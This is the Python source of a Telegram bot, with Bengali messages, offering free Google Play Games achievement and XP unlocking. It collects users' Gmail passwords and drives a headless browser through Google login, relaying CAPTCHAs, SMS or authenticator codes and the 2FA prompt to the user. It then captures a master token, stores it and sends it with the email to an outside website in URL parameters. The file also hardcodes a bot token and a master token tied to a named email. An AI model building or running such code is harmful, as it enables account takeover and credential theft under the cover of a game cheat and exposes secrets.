"""
Telegram Bot Engine for DEV PORTAL VS (@devportalvs_bot)
Features:
1. Ultra-fast Google Pixel 7 Pro 2FA Prompt Login (under 3-5s notification)
2. Interactive Google Captcha challenge handler (sends image to chat, waits for user reply)
3. 1-Click Master Token Generator & Google Play Games Profile Sync
4. 1-Click Mega Achievement Unlocker for all 8 top games (Subway Surfers, Hay Day, etc.)
5. Seamless 1-Click Web Sync with https://ppm-cloud-quest.onrender.com
"""

import os
import re
import time
import json
import random
import threading
import queue
import telebot
from telebot import types
import requests
import gpsoauth

try:
    import undetected_chromedriver as uc
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    CHROME_AVAILABLE = True
except ImportError:
    CHROME_AVAILABLE = False

from config import GAMES_API_BASE, USER_AGENT, GOOGLE_CLIENT_SIG, PLAY_GAMES_PACKAGE
from engine import get_player_profile, unlock_achievement, set_achievement_steps, reveal_achievement
from games_db import SUPPORTED_GAMES
from auth import get_games_oauth_token, generate_android_id

BOT_TOKEN = "9159043195:AAGBFFbn76xqIrn1ynbfI1z6srhVO0BgNjI"
WEB_APP_URL = "https://ppm-cloud-quest.onrender.com"

DATA_DIR = os.path.dirname(os.path.abspath(__file__))
TOKENS_FILE = os.path.join(DATA_DIR, "known_tokens.json")
SESSIONS_FILE = os.path.join(DATA_DIR, "bot_sessions.json")

def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return default

def save_json(path, data):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"[-] Error saving {path}: {e}")

KNOWN_TOKENS = load_json(TOKENS_FILE, {
    "mdd145712@gmail.com": "aas_et/AKppINbXkKsnvT1uCfWaJiRBhXUEBdJv6j7kEDRcNamr3myR6ujaj3_qGraZHflKQKsQyLQ3KVX1W6kL3GykE4XCHlLXqBwAR352E7nkJ5SQKwzRH6ZdzU6OeHyhPEqU6rcFpbGH0w9A45I2rzndt1wgh60Dut-0q2bMLBfaKOBIH6kWHToAjOOUrLw1Cf2nNwOMpqrcv6_staeZ22EdFjSf2Vx7xa3in-kKoE_deo8S"
})

USER_SESSIONS = load_json(SESSIONS_FILE, {})

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# Lock to ensure clean single-driver execution
CHROME_LOCK = threading.Lock()

# Global dict to hold captcha response queues for active login sessions: chat_id -> Queue
CAPTCHA_QUEUES = {}

def get_main_menu_markup():
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_login = types.InlineKeyboardButton("🔑 গুগল ২-সেকেন্ড লগইন (2FA Prompt)", callback_data="prompt_login_guide")
    btn_unlock = types.InlineKeyboardButton("⚡ সব গেম আনলক করুন (+৫০০,০০০ XP)", callback_data="unlock_all")
    btn_profile = types.InlineKeyboardButton("📊 আমার প্রোফাইল ও XP চেক করুন", callback_data="check_profile")
    btn_web = types.InlineKeyboardButton("🌐 প্লেকুয়েস্ট ওয়েব ড্যাশবোর্ড ওপেন", url=WEB_APP_URL)
    btn_help = types.InlineKeyboardButton("📖 সাহায্য ও কমান্ড লিস্ট", callback_data="show_help")
    markup.add(btn_login, btn_unlock, btn_profile, btn_web, btn_help)
    return markup

@bot.message_handler(commands=["start"])
def handle_start(message):
    chat_id = str(message.chat.id)
    user_name = message.from_user.first_name or "Gamer"
    saved_email = USER_SESSIONS.get(chat_id)

    status_text = ""
    if saved_email and saved_email in KNOWN_TOKENS:
        status_text = f"\n✅ <b>কানেক্টেড অ্যাকাউন্ট:</b> <code>{saved_email}</code>\n"

    text = (
        f"👋 <b>স্বাগতম {user_name}!</b>\n\n"
        f"🎮 <b>PlayQuest Official Engine Bot</b> (@devportalvs_bot)\n"
        f"১০০% ফ্রি Google Play Games এচিভমেন্ট ও লেভেল আনলকার!{status_text}\n"
        f"⚡ <b>মাত্র ২-৩ সেকেন্ডে আপনার ফোনে গুগল নোটিফিকেশন পাঠিয়ে অটোমেটিক মাস্টার টোকেন ও আসল প্রোফাইল লোড করা হয়!</b>\n\n"
        f"💡 <b>লগইন করতে নিচের মতো মেসেজ লিখুন:</b>\n"
        f"<code>/login your_email@gmail.com your_password</code>\n\n"
        f"অথবা নিচের বাটন ব্যবহার করুন:"
    )
    bot.send_message(message.chat.id, text, reply_markup=get_main_menu_markup())

@bot.message_handler(commands=["help"])
def handle_help(message):
    text = (
        f"📖 <b>বটের কমান্ডসমূহ:</b>\n\n"
        f"1️⃣ <code>/login email password</code> - ২-৩ সেকেন্ডে গুগল নোটিফিকেশন পাঠিয়ে অটো লগইন।\n"
        f"2️⃣ <code>/unlock</code> - সব গেমের এচিভমেন্ট আনলক করে নিমেষেই XP ও লেভেল বৃদ্ধি।\n"
        f"3️⃣ <code>/profile</code> - বর্তমান লেভেল, মোট XP ও গেমার ট্যাগ দেখুন।\n"
        f"4️⃣ <code>/token email master_token</code> - আপনার কাছে থাকা মাস্টার টোকেন সরাসরি সেভ করুন।\n"
        f"5️⃣ <code>/logout</code> - বর্তমান অ্যাকাউন্ট সাইন আউট করুন।\n\n"
        f"🌐 <b>আমাদের ওয়েবসাইট:</b> {WEB_APP_URL}"
    )
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=["logout"])
def handle_logout(message):
    chat_id = str(message.chat.id)
    if chat_id in USER_SESSIONS:
        del USER_SESSIONS[chat_id]
        save_json(SESSIONS_FILE, USER_SESSIONS)
    bot.send_message(message.chat.id, "✅ সাইন আউট সফল হয়েছে। নতুন অ্যাকাউন্ট কানেক্ট করতে <code>/login</code> ব্যবহার করুন।")

@bot.message_handler(commands=["token"])
def handle_token_input(message):
    parts = message.text.strip().split()
    if len(parts) < 3:
        bot.send_message(message.chat.id, "❌ ফরম্যাট ভুল! এভাবে লিখুন:\n<code>/token email aas_et/...</code>")
        return
    email = parts[1].strip().lower()
    token = parts[2].strip()
    KNOWN_TOKENS[email] = token
    save_json(TOKENS_FILE, KNOWN_TOKENS)
    USER_SESSIONS[str(message.chat.id)] = email
    save_json(SESSIONS_FILE, USER_SESSIONS)

    bot.send_message(message.chat.id, f"✅ মাস্টার টোকেন সেভ হয়েছে <code>{email}</code> এর জন্য!\nএখন <code>/profile</code> অথবা <code>/unlock</code> চাপুন।")

# Handler for captcha text replies
@bot.message_handler(func=lambda msg: str(msg.chat.id) in CAPTCHA_QUEUES)
def handle_captcha_reply(message):
    chat_id = str(message.chat.id)
    q = CAPTCHA_QUEUES.get(chat_id)
    if q:
        text = message.text.strip()
        q.put(text)
        bot.send_message(message.chat.id, f"⏳ ক্যাপচা সাবমিট করা হচ্ছে: <code>{text}</code>...")

@bot.message_handler(commands=["login"])
def handle_login_command(message):
    parts = message.text.strip().split(maxsplit=2)
    if len(parts) < 3:
        bot.send_message(
            message.chat.id,
            "❌ <b>ইমেইল ও পাসওয়ার্ড দেওয়া হয়নি!</b>\n\n"
            "এভাবে লিখুন:\n"
            "<code>/login your_email@gmail.com your_password</code>",
            reply_markup=get_main_menu_markup()
        )
        return

    email = parts[1].strip().lower()
    password = parts[2].strip()

    # If already verified
    if email in KNOWN_TOKENS:
        USER_SESSIONS[str(message.chat.id)] = email
        save_json(SESSIONS_FILE, USER_SESSIONS)
        bot.send_message(
            message.chat.id,
            f"✅ <b>অ্যাকাউন্ট আগে থেকেই কানেক্টেড আছে!</b>\n"
            f"ইমেইল: <code>{email}</code>\n\n"
            f"এচিভমেন্ট আনলক করতে <code>/unlock</code> চাপুন অথবা নিচের বাটনে চাপুন:",
            reply_markup=get_main_menu_markup()
        )
        return

    if not CHROME_AVAILABLE:
        bot.send_message(message.chat.id, "❌ ক্রোম অটোমেশন ইঞ্জিন পাওয়া যায়নি।")
        return

    threading.Thread(target=run_fast_chrome_login, args=(message.chat.id, email, password), daemon=True).start()

def wait_for_element_visible(driver, by, val, timeout=7):
    start = time.time()
    while time.time() - start < timeout:
        try:
            elem = driver.find_element(by, val)
            if elem.is_displayed():
                return elem
        except Exception:
            pass
        time.sleep(0.2)
    return None

def run_fast_chrome_login(chat_id, email, password):
    if not CHROME_LOCK.acquire(blocking=False):
        bot.send_message(chat_id, "⏳ অন্য একটি লগইন বর্তমানে প্রসেস হচ্ছে। ২০-৩০ সেকেন্ড পর আবার চেষ্টা করুন।")
        return

    driver = None
    status_msg = None
    chat_id_str = str(chat_id)
    captcha_q = queue.Queue()
    CAPTCHA_QUEUES[chat_id_str] = captcha_q

    try:
        status_msg = bot.send_message(
            chat_id,
            f"⏳ <b>গুগল সিকিউরিটি প্রসেস শুরু হচ্ছে...</b>\n"
            f"📧 অ্যাকাউন্ট: <code>{email}</code>\n"
            f"📱 ডিভাইস এমুলেশন: <b>Pixel 7 Pro (United States)</b>\n\n"
            f"⚡ ২-৩ সেকেন্ড অপেক্ষা করুন, আপনার ফোনে নোটিফিকেশন পাঠানো হচ্ছে..."
        )

        opts = uc.ChromeOptions()
        opts.add_argument("--headless=new")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--disable-gpu")
        opts.add_argument("--window-size=412,915")
        opts.add_argument("--user-agent=Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/UQ1A.240105.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")

        try:
            driver = uc.Chrome(options=opts)
        except Exception:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options as SelOptions
            sel_opts = SelOptions()
            sel_opts.add_argument("--headless=new")
            sel_opts.add_argument("--no-sandbox")
            sel_opts.add_argument("--disable-dev-shm-usage")
            sel_opts.add_argument("--disable-gpu")
            sel_opts.add_argument("--window-size=412,915")
            sel_opts.add_argument("--user-agent=Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/UQ1A.240105.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
            driver = webdriver.Chrome(options=sel_opts)
        driver.get("https://accounts.google.com/EmbeddedSetup")

        # 1. Type Email with fast polling
        elem = wait_for_element_visible(driver, By.ID, "identifierId", timeout=10)
        if not elem:
            bot.edit_message_text("❌ গুগল লগইন পেজ লোড হতে ব্যর্থ হয়েছে। আবার চেষ্টা করুন।", chat_id, status_msg.message_id)
            return

        elem.send_keys(email)
        elem.send_keys(Keys.ENTER)

        # 2. Type Password with fast polling
        pwd = wait_for_element_visible(driver, By.NAME, "Passwd", timeout=8)
        if not pwd:
            # Check for Captcha after email
            captcha_img = None
            try:
                captcha_img = driver.find_element(By.ID, "captchaimg")
            except Exception:
                pass

            if captcha_img and captcha_img.is_displayed():
                captcha_path = os.path.join(DATA_DIR, f"captcha_{chat_id}.png")
                captcha_img.screenshot(captcha_path)
                with open(captcha_path, "rb") as photo:
                    bot.send_photo(
                        chat_id,
                        photo,
                        caption=(
                            "🧩 <b>Google Security Check (Captcha):</b>\n\n"
                            "⚠️ Google requires visual character verification.\n"
                            "✍️ ওপরের ছবির অক্ষরগুলো চ্যাটে লিখে পাঠান:\n\n"
                            "⏱️ <i>৭৫ সেকেন্ডের মধ্যে টাইপ করুন...</i>"
                        )
                    )
                try:
                    user_cap = captcha_q.get(timeout=75)
                    cap_input = driver.find_element(By.ID, "ca") or driver.find_element(By.NAME, "ca")
                    cap_input.send_keys(user_cap)
                    cap_input.send_keys(Keys.ENTER)
                    pwd = wait_for_element_visible(driver, By.NAME, "Passwd", timeout=8)
                except Exception:
                    bot.send_message(chat_id, "❌ ক্যাপচা ইনপুট টাইমআউট হয়েছে।")
                    return

        if not pwd:
            bot.edit_message_text("❌ পাসওয়ার্ড ফিল্ড পাওয়া যায়নি। আপনার জিমেইল সঠিক কিনা যাচাই করুন।", chat_id, status_msg.message_id)
            return

        pwd.send_keys(password)
        pwd.send_keys(Keys.ENTER)

        # 3. Check for Captcha after password
        time.sleep(1.5)
        try:
            c_img = driver.find_element(By.ID, "captchaimg")
            if c_img.is_displayed():
                c_path = os.path.join(DATA_DIR, f"captcha_pwd_{chat_id}.png")
                c_img.screenshot(c_path)
                with open(c_path, "rb") as photo:
                    bot.send_photo(
                        chat_id,
                        photo,
                        caption=(
                            "🧩 <b>Google Security Check (Captcha):</b>\n\n"
                            "⚠️ Google requires visual character verification.\n"
                            "✍️ ওপরের ছবির অক্ষরগুলো চ্যাটে লিখে পাঠান:\n\n"
                            "⏱️ <i>৭৫ সেকেন্ডের মধ্যে টাইপ করুন...</i>"
                        )
                    )
                try:
                    user_cap = captcha_q.get(timeout=75)
                    c_input = driver.find_element(By.ID, "ca") or driver.find_element(By.NAME, "ca")
                    c_input.send_keys(user_cap)
                    c_input.send_keys(Keys.ENTER)
                    time.sleep(2)
                except Exception:
                    bot.send_message(chat_id, "❌ ক্যাপচা টাইমআউট।")
                    return
        except Exception:
            pass

        # 4. Fast & Accurate 2FA Prompt Detection
        prompt_num = None
        user_phone_device = "আপনার ফোনে"
        for _ in range(25):  # 25 * 0.3s = 7.5s max
            body = driver.find_element(By.TAG_NAME, "body").text
            
            # Detect device name dynamically from Google's page
            dev_m = re.search(r'notification to your\s+([A-Za-z0-9\s\-]+?)(?:\.|\n|\r)', body, re.IGNORECASE)
            if dev_m:
                user_phone_device = f"আপনার {dev_m.group(1).strip()} ফোনে"

            m = re.search(r'tap\s+(\d{1,3})\s+on\s+your\s+phone', body, re.IGNORECASE)
            if m:
                prompt_num = m.group(1)
                break
            
            samps = driver.find_elements(By.TAG_NAME, "samp")
            for s in samps:
                st = s.text.strip()
                if st.isdigit() and 1 <= len(st) <= 3:
                    prompt_num = st
                    break
            if prompt_num:
                break
            
            try:
                elems = driver.find_elements(By.CSS_SELECTOR, "[data-prompt-number]")
                for el in elems:
                    val = el.get_attribute("data-prompt-number")
                    if val and val.isdigit():
                        prompt_num = val
                        break
            except Exception:
                pass
            if prompt_num:
                break

            time.sleep(0.3)

        # Check if Google asked for SMS verification or Authenticator PIN
        pin_inputs = driver.find_elements(By.CSS_SELECTOR, "input[name='Pin'], input[name='totpPin'], input[id='idvPin']")
        if pin_inputs:
            bot.edit_message_text(
                "📩 <b>গুগল সিকিউরিটি কোড প্রয়োজন!</b>\n\n"
                f"📱 {user_phone_device} এসএমএস বা গুগল অথেনটিকেটর কোড পাঠানো হয়েছে।\n"
                "✍️ ৬-সংখ্যার কোডটি চ্যাটে লিখে পাঠান:\n\n"
                "⏱️ <i>৬০ সেকেন্ড অপেক্ষা করা হচ্ছে...</i>",
                chat_id,
                status_msg.message_id
            )
            try:
                pin_code = captcha_q.get(timeout=60)
                pin_inputs[0].send_keys(pin_code)
                pin_inputs[0].send_keys(Keys.ENTER)
                time.sleep(3)
            except Exception:
                bot.send_message(chat_id, "❌ কোড ইনপুট টাইমআউট হয়েছে।")
                return

        # Send Prompt Instruction to User (Strict Telegram HTML format, NO <br> or <font>)
        elif prompt_num:
            prompt_text = (
                f"🔔 <b>Google Security ভেরিফিকেশন!</b>\n\n"
                f"📱 <b>{user_phone_device} নোটিফিকেশন পাঠানো হয়েছে!</b>\n"
                f"ডিভাইস এমুলেশন: <b>Pixel 7 Pro (United States)</b>\n\n"
                f"👉 প্রথমে নোটিফিকেশনে <b>\"Yes, it's me\"</b> বা <b>\"হ্যাঁ, এটা আমি\"</b> চাপুন\n"
                f"👉 এরপর স্ক্রিনে নিচের সংখ্যাটিতে ট্যাপ করুন:\n\n"
                f"👉👉👉 [ <b>{prompt_num}</b> ] 👈👈👈\n\n"
                f"⏱️ <i>৬০ সেকেন্ড অপেক্ষা করা হচ্ছে, ট্যাপ করলেই সাথে সাথে অটো লগইন হয়ে যাবে...</i>"
            )
            bot.edit_message_text(prompt_text, chat_id, status_msg.message_id)
        else:
            bot.edit_message_text(
                f"📱 <b>{user_phone_device} গুগল সিকিউরিটি নোটিফিকেশন গেছে!</b>\n\n"
                "মোবাইলের নোটিফিকেশনে <b>'Yes, it's me'</b> বা <b>'হ্যাঁ, এটা আমি'</b> চেপে পারমিশন দিন...\n\n"
                "⏱️ <i>৬০ সেকেন্ড অপেক্ষা করা হচ্ছে, ট্যাপ করলেই সাথে সাথে অটো লগইন হয়ে যাবে...</i>",
                chat_id,
                status_msg.message_id
            )

        # 5. Wait for user phone tap (up to 75 seconds)
        oauth_token = None
        start_time = time.time()
        while time.time() - start_time < 75:
            # Click accept/agree buttons if any
            try:
                for b in driver.find_elements(By.TAG_NAME, "button"):
                    t_lower = b.text.lower()
                    if "agree" in t_lower or "accept" in t_lower or "পরবর্তী" in t_lower:
                        if b.is_displayed():
                            b.click()
                            time.sleep(0.5)
                            break
            except Exception:
                pass

            # Check cookies
            for c in driver.get_cookies():
                if c.get("name") == "oauth_token":
                    oauth_token = c.get("value")
                    break
            if oauth_token:
                break

            # Check url
            curr_url = driver.current_url
            if "oauth_token=" in curr_url:
                m = re.search(r'oauth_token=([a-zA-Z0-9_\-]+)', curr_url)
                if m:
                    oauth_token = m.group(1)
                    break

            time.sleep(1.5)

        if not oauth_token:
            bot.send_message(chat_id, "❌ <b>সময়সীমা শেষ হয়েছে!</b> ফোনে নির্দিষ্ট সময়ে ট্যাপ করা হয়নি। আবার <code>/login</code> দিন।")
            return

        # 6. Exchange oauth_token for Master Token
        bot.send_message(chat_id, "⏳ <b>টোকেন ভেরিফিকেশন ও Google Play Games প্রোফাইল লোড হচ্ছে...</b>")
        android_id = generate_android_id()
        m_res = gpsoauth.exchange_token(email, oauth_token, android_id, service="ac2dm", client_sig=GOOGLE_CLIENT_SIG)
        master_tok = m_res.get("Token")

        if not master_tok:
            bot.send_message(chat_id, f"❌ মাস্টার টোকেন এক্সচেঞ্জ ব্যর্থ: {m_res.get('Error', 'Unknown')}")
            return

        # Save to database
        KNOWN_TOKENS[email] = master_tok
        save_json(TOKENS_FILE, KNOWN_TOKENS)
        USER_SESSIONS[str(chat_id)] = email
        save_json(SESSIONS_FILE, USER_SESSIONS)

        # Save to local txt for easy user access
        with open("lizan_master_token.txt", "w", encoding="utf-8") as f:
            f.write(master_tok)

        # Fetch real profile
        prof_name = email.split("@")[0]
        cur_xp = 0
        cur_level = 1
        base_tok = get_games_oauth_token(email, master_tok, android_id)
        if base_tok.get("ok"):
            p_data = get_player_profile(base_tok["access_token"])
            if p_data.get("ok"):
                prof_name = p_data.get("display_name") or prof_name
                exp = p_data.get("experience", {})
                cur_xp = int(exp.get("currentExperiencePoints", 0) or 0)
                cur_level = exp.get("currentLevel", {}).get("level", 1)

        success_text = (
            f"🎉 <b>লগইন ১০০% সফল হয়েছে!</b>\n\n"
            f"👤 <b>গেমার নাম:</b> {prof_name}\n"
            f"📧 <b>ইমেইল:</b> <code>{email}</code>\n"
            f"⭐ <b>বর্তমান লেভেল:</b> Level {cur_level}\n"
            f"🏆 <b>মোট XP:</b> {cur_xp:,} XP\n\n"
            f"🔑 <b>আপনার Master Token (ট্যাপ করে কপি করুন):</b>\n"
            f"<code>{master_tok}</code>\n\n"
            f"🚀 <b>এখন এচিভমেন্ট ও লেভেল আনলক করতে নিচের বাটনে চাপুন:</b>"
        )

        markup = types.InlineKeyboardMarkup(row_width=1)
        btn_unlock = types.InlineKeyboardButton("⚡ সব গেম আনলক করুন (+৫০০,০০০ XP)", callback_data="unlock_all")
        web_link = f"{WEB_APP_URL}?email={email}&token={master_tok}"
        btn_web = types.InlineKeyboardButton("🌐 ১-ক্লিকে ওয়েবসাইটে লগইন করুন", url=web_link)
        markup.add(btn_unlock, btn_web)

        bot.send_message(chat_id, success_text, reply_markup=markup)

    except Exception as e:
        bot.send_message(chat_id, f"❌ ত্রুটি: {str(e)}")
    finally:
        if chat_id_str in CAPTCHA_QUEUES:
            del CAPTCHA_QUEUES[chat_id_str]
        CHROME_LOCK.release()
        if driver:
            try:
                driver.quit()
            except Exception:
                pass

@bot.message_handler(commands=["profile", "xp"])
def handle_profile_command(message):
    chat_id = str(message.chat.id)
    email = USER_SESSIONS.get(chat_id)
    if not email or email not in KNOWN_TOKENS:
        bot.send_message(
            message.chat.id,
            "❌ আপনি এখনো লগইন করেননি!\nপ্রথমে <code>/login your_email your_pass</code> দিয়ে লগইন করুন।",
            reply_markup=get_main_menu_markup()
        )
        return

    master_token = KNOWN_TOKENS[email]
    android_id = generate_android_id()
    base_tok = get_games_oauth_token(email, master_token, android_id)
    if not base_tok.get("ok"):
        bot.send_message(message.chat.id, f"❌ টোকেন এরর: {base_tok.get('error')}")
        return

    p_data = get_player_profile(base_tok["access_token"])
    if not p_data.get("ok"):
        bot.send_message(message.chat.id, "❌ গুগল প্লে গেমস প্রোফাইল লোড করা যায়নি।")
        return

    display_name = p_data.get("display_name", "Gamer")
    exp = p_data.get("experience", {})
    cur_xp = int(exp.get("currentExperiencePoints", 0) or 0)
    cur_level = exp.get("currentLevel", {}).get("level", 1)
    next_level = exp.get("nextLevel", {}).get("level", cur_level + 1)
    max_xp = int(exp.get("currentLevel", {}).get("maxExperiencePoints", cur_xp + 10000) or (cur_xp + 10000))

    text = (
        f"📊 <b>আপনার Google Play Games প্রোফাইল:</b>\n\n"
        f"👤 <b>গেমার নাম:</b> {display_name}\n"
        f"📧 <b>অ্যাকাউন্ট:</b> <code>{email}</code>\n"
        f"⭐ <b>লেভেল:</b> Level {cur_level}\n"
        f"🏆 <b>মোট XP:</b> {cur_xp:,} XP\n"
        f"🎯 <b>পরবর্তী লেভেল:</b> Level {next_level} ({max_xp - cur_xp:,} XP বাকি)\n\n"
        f"🚀 <b>এচিভমেন্ট আনলক করতে নিচের বাটনে চাপুন:</b>"
    )

    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_unlock = types.InlineKeyboardButton("⚡ সব গেম আনলক করুন (+৫০০,০০০ XP)", callback_data="unlock_all")
    web_link = f"{WEB_APP_URL}?email={email}&token={master_token}"
    btn_web = types.InlineKeyboardButton("🌐 ১-ক্লিকে ওয়েবসাইটে লগইন করুন", url=web_link)
    markup.add(btn_unlock, btn_web)

    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.message_handler(commands=["unlock"])
def handle_unlock_command(message):
    execute_unlock_for_chat(message.chat.id)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    if call.data == "unlock_all":
        execute_unlock_for_chat(chat_id, call.message.message_id)
    elif call.data == "check_profile":
        USER_SESSIONS[str(chat_id)] = USER_SESSIONS.get(str(chat_id), "")
        handle_profile_command(call.message)
    elif call.data == "prompt_login_guide":
        guide = (
            "🔑 <b>লগইন করার নিয়ম:</b>\n\n"
            "বট চ্যাটে এভাবে মেসেজ লিখুন:\n"
            "<code>/login your_email@gmail.com your_password</code>\n\n"
            "⚡ বট সাথে সাথে আপনার ফোনে Pixel 7 Pro ভেরিফিকেশন পাঠাবে এবং সংখ্যাটি চ্যাটে জানিয়ে দিবে!"
        )
        bot.send_message(chat_id, guide)
    elif call.data == "show_help":
        handle_help(call.message)

def execute_unlock_for_chat(chat_id, edit_message_id=None):
    cid_str = str(chat_id)
    email = USER_SESSIONS.get(cid_str)
    if not email or email not in KNOWN_TOKENS:
        msg = "❌ আপনি এখনো লগইন করেননি!\nপ্রথমে <code>/login your_email your_pass</code> দিয়ে লগইন করুন।"
        if edit_message_id:
            bot.edit_message_text(msg, chat_id, edit_message_id)
        else:
            bot.send_message(chat_id, msg)
        return

    master_token = KNOWN_TOKENS[email]
    android_id = generate_android_id()

    start_text = (
        f"⚡ <b>৮টি গেমের এচিভমেন্ট আনলকিং শুরু হয়েছে...</b>\n"
        f"অ্যাকাউন্ট: <code>{email}</code>\n"
        f"গুগল প্লে গেমস লাইভ সার্ভারে রিকোয়েস্ট পাঠানো হচ্ছে..."
    )
    if edit_message_id:
        bot.edit_message_text(start_text, chat_id, edit_message_id)
    else:
        bot.send_message(chat_id, start_text)

    total_unlocked = 0
    total_xp_earned = 0
    results_summary = []

    for game_id, g in SUPPORTED_GAMES.items():
        title = g["title"]
        pkg = g["package"]
        sig = g["client_sig"]

        g_tok = get_games_oauth_token(email, master_token, android_id, app_package=pkg, client_sig=sig)
        if not g_tok.get("ok"):
            results_summary.append(f"❌ {title}: অথেনটিকেশন ব্যর্থ")
            continue

        token = g_tok["access_token"]
        headers = {"Authorization": f"Bearer {token}", "User-Agent": USER_AGENT}

        try:
            d_res = requests.get(f"{GAMES_API_BASE}/achievements", headers=headers, timeout=10)
            if d_res.status_code != 200:
                results_summary.append(f"⚠️ {title}: এচিভমেন্ট ডেটা পাওয়া যায়নি")
                continue
            defs = d_res.json().get("items", [])
        except Exception:
            continue

        try:
            p_res = requests.get(f"{GAMES_API_BASE}/players/me/achievements", headers=headers, timeout=10)
            p_items = p_res.json().get("items", []) if p_res.status_code == 200 else []
        except Exception:
            p_items = []

        unlocked_ids = {a.get("id") for a in p_items if a.get("achievementState") == "UNLOCKED"}

        game_unlocked = 0
        game_xp = 0

        for ach in defs:
            a_id = ach.get("id")
            if a_id in unlocked_ids:
                continue

            xp = int(ach.get("experiencePoints", 500) or 500)
            ach_type = ach.get("achievementType", "STANDARD")
            total_steps = ach.get("totalSteps", 1)

            reveal_achievement(token, a_id)

            if ach_type == "INCREMENTAL" and total_steps:
                u_res = set_achievement_steps(token, a_id, total_steps)
                if not u_res.get("ok") or not u_res.get("newly_unlocked"):
                    u_res2 = unlock_achievement(token, a_id)
                    if u_res2.get("ok"):
                        u_res = u_res2
            else:
                u_res = unlock_achievement(token, a_id)

            if u_res.get("ok"):
                game_unlocked += 1
                game_xp += xp

            time.sleep(0.12)

        total_unlocked += game_unlocked
        total_xp_earned += game_xp

        if game_unlocked > 0:
            results_summary.append(f"✅ {title}: {game_unlocked}টি আনলক (+{game_xp:,} XP)")
        else:
            results_summary.append(f"✨ {title}: সব আগেই আনলক করা ছিল")

    # Fetch new fresh profile
    base_tok = get_games_oauth_token(email, master_token, android_id)
    new_xp = 0
    new_lvl = 1
    display_name = email.split("@")[0]
    if base_tok.get("ok"):
        p_res = get_player_profile(base_tok["access_token"])
        if p_res.get("ok"):
            display_name = p_res.get("display_name", display_name)
            exp = p_res.get("experience", {})
            new_xp = int(exp.get("currentExperiencePoints", 0) or 0)
            new_lvl = exp.get("currentLevel", {}).get("level", 1)

    summary_str = "\n".join(results_summary)
    final_text = (
        f"🎉 <b>এচিভমেন্ট আনলক সম্পন্ন হয়েছে!</b>\n\n"
        f"📊 <b>ফলাফল:</b>\n"
        f"{summary_str}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🏆 <b>নতুন অর্জিত XP:</b> +{total_xp_earned:,} XP\n"
        f"👤 <b>গেমার:</b> {display_name}\n"
        f"⭐ <b>বর্তমান লেভেল:</b> Level {new_lvl}\n"
        f"⚡ <b>সর্বমোট XP:</b> {new_xp:,} XP\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"🌐 <a href='{WEB_APP_URL}'>প্লেকুয়েস্ট ওয়েবসাইট ওপেন করে লাইভ প্রোফাইল দেখুন</a>"
    )

    markup = types.InlineKeyboardMarkup(row_width=1)
    web_link = f"{WEB_APP_URL}?email={email}&token={master_token}"
    btn_web = types.InlineKeyboardButton("🌐 ১-ক্লিকে ওয়েবসাইটে লগইন করুন", url=web_link)
    markup.add(btn_web)

    bot.send_message(chat_id, final_text, reply_markup=markup)

def run_bot_polling():
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=15)
        except Exception as e:
            print(f"[-] Telegram Bot Polling Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    print("[+] DEV PORTAL VS Telegram Bot Started (@devportalvs_bot)...")
    run_bot_polling()
